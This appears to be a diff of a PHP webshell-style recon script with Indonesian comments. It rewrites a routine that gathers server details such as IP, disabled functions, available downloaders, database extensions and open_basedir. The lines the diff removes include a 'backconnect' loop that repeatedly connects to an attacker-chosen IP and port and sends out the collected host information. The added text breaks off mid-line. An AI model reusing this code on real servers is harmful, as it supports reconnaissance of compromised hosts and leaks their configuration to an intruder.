@@ -20,8 +20,12 @@ function get_system_info() {
     $info['php_version'] = phpversion();
     $info['safe_mode'] = ini_get('safe_mode') ? 'ON' : 'OFF';
     
-    // IP Server (kompatibel PHP 5)
-    $info['server_ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
+    // IP Server (kompatibel PHP 5.3)
+    if (isset($_SERVER['SERVER_ADDR'])) {
+        $info['server_ip'] = $_SERVER['SERVER_ADDR'];
+    } else {
+        $info['server_ip'] = gethostbyname(gethostname());
+    }
     
     // DateTime
     $info['datetime'] = date('Y-m-d H:i:s');
@@ -56,29 +60,58 @@ function get_system_info() {
     if (is_executable('/usr/bin/curl') || is_executable('/bin/curl')) {
         $downloader[] = "curl";
     }
-    $info['downloader'] = count($downloader) > 0 ? implode(' ', $downloader) : "None";
+    if (count($downloader) > 0) {
+        $info['downloader'] = implode(' ', $downloader);
+    } else {
+        $info['downloader'] = "None";
+    }
     
     // Disable Functions
     $disable_functions = ini_get('disable_functions');
-    $info['disable_functions'] = empty($disable_functions) ? "All Functions Accessible" : $disable_functions;
+    if (empty($disable_functions)) {
+        $info['disable_functions'] = "All Functions Accessible";
+    } else {
+        $info['disable_functions'] = $disable_functions;
+    }
     
     // PHP Modules
     $info['curl_status'] = extension_loaded('curl') ? "ON" : "OFF";
     $info['ssh2_status'] = extension_loaded('ssh2') ? "ON" : "OFF";
     $info['magic_quotes'] = get_magic_quotes_gpc() ? "ON" : "OFF";
-    $info['mysql_status'] = extension_loaded('mysqli') || extension_loaded('mysql') ? "ON" : "OFF";
+    $info['mysql_status'] = (extension_loaded('mysqli') || extension_loaded('mysql')) ? "ON" : "OFF";
     $info['mssql_status'] = extension_loaded('mssql') ? "ON" : "OFF";
     $info['pgsql_status'] = extension_loaded('pgsql') ? "ON" : "OFF";
     $info['oracle_status'] = extension_loaded('oci8') ? "ON" : "OFF";
-    $info['cgi_status'] = strpos(php_sapi_name(), 'cgi') !== false ? "ON" : "OFF";
+    $info['cgi_status'] = (strpos(php_sapi_name(), 'cgi') !== false) ? "ON" : "OFF";
     
     // Open_basedir, etc.
-    $info['open_basedir'] = ini_get('open_basedir') ? ini_get('open_basedir') : "NONE";
-    $info['safe_mode_exec_dir'] = ini_get('safe_mode_exec_dir') ? ini_get('safe_mode_exec_dir') : "NONE";
-    $info['safe_mode_include_dir'] = ini_get('safe_mode_include_dir') ? ini_get('safe_mode_include_dir') : "NONE";
+    $open_basedir = ini_get('open_basedir');
+    if ($open_basedir === '') {
+        $info['open_basedir'] = "NONE";
+    } else {
+        $info['open_basedir'] = $open_basedir;
+    }
+    
+    $safe_mode_exec_dir = ini_get('safe_mode_exec_dir');
+    if ($safe_mode_exec_dir === '') {
+        $info['safe_mode_exec_dir'] = "NONE";
+    } else {
+        $info['safe_mode_exec_dir'] = $safe_mode_exec_dir;
+    }
+    
+    $safe_mode_include_dir = ini_get('safe_mode_include_dir');
+    if ($safe_mode_include_dir === '') {
+        $info['safe_mode_include_dir'] = "NONE";
+    } else {
+        $info['safe_mode_include_dir'] = $safe_mode_include_dir;
+    }
     
     // Software Web Server
-    $info['software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : "Unknown";
+    if (isset($_SERVER['SERVER_SOFTWARE'])) {
+        $info['software'] = $_SERVER['SERVER_SOFTWARE'];
+    } else {
+        $info['software'] = "Unknown";
+    }
     
     return $info;
 }
@@ -133,45 +166,4 @@ function send_info() {
     $output .= "\033[1;33mDisable Functions:\033[0m\t\033[1;37m{$info['disable_functions']}\033[0m\n";
     
     // PHP Modules
-    $output .= "\033[1;33mCURL :\033[0m\t\033[1;37m{$info['curl_status']} | SSH2 : {$info['ssh2_status']} | Magic Quotes : {$info['magic_quotes']} | MySQL : {$info['mysql_status']} | MSSQL : {$info['mssql_status']} | PostgreSQL : {$info['pgsql_status']} | Oracle : {$info['oracle_status']} | CGI : {$info['cgi_status']}\033[0m\n";
-    
-    // Open_basedir, etc.
-    $output .= "\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{$info['open_basedir']} | Safe_mode_exec_dir : {$info['safe_mode_exec_dir']} | Safe_mode_include_dir : {$info['safe_mode_include_dir']}\033[0m\n";
-    
-    // Software
-    $output .= "\033[1;33mSoftWare:\033[0m\t\033[1;37m{$info['software']}\033[0m\n";
-    
-    $output .= "\n";
-    $output .= "\033[1;32m========================================\033[0m\n";
-    $output .= "\033[1;31m            END OF INFO\033[0m\n";
-    $output .= "\033[1;32m========================================\033[0m\n\n";
-    
-    return $output;
-}
-
-// Fungsi backconnect
-function backconnect($target_ip, $target_port, $reconnect_interval) {
-    while (true) {
-        echo "[*] Mencoba koneksi ke $target_ip:$target_port...\n";
-        
-        // Coba koneksi dengan socket
-        $socket = @fsockopen($target_ip, $target_port, $errno, $errstr, 10);
-        
-        if ($socket) {
-            // Kirim informasi sistem
-            $info = send_info();
-            fwrite($socket, $info);
-            fclose($socket);
-            echo "[*] Informasi terkirim!\n";
-        } else {
-            echo "[!] Koneksi gagal: $errstr ($errno)\n";
-        }
-        
-        echo "[!] Reconnect dalam $reconnect_interval detik...\n";
-        sleep($reconnect_interval);
-    }
-}
-
-// Jalankan backconnect
-backconnect($target_ip, $target_port, $reconnect_interval);
-?>
+    $output .= "\033[1;33mCURL :\033[0m\t\033[1;37m{$info['curl_status']} | SSH2 : {$info['ssh2_status']} | Magic Quotes : {$info['magic_quotes']} | MySQL : {$info['mysql_status']} | MSSQL : {$info['m
